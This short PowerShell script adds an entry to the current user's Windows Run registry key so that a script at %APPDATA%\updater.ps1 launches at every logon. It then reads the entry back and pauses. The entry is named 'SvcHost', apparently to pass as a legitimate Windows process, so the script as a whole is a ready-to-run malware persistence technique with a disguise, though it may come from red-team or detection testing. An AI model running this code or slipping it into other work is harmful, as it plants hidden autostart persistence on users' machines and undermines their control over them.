
[CmdletBinding()]
param(
    [string]$PersistencePath = "$env:APPDATA\updater.ps1",
    [string]$RegistryValue = 'SvcHost'
)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryValue -Value $PersistencePath -PropertyType String -Force
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RegistryValue
Start-Sleep -Seconds 7
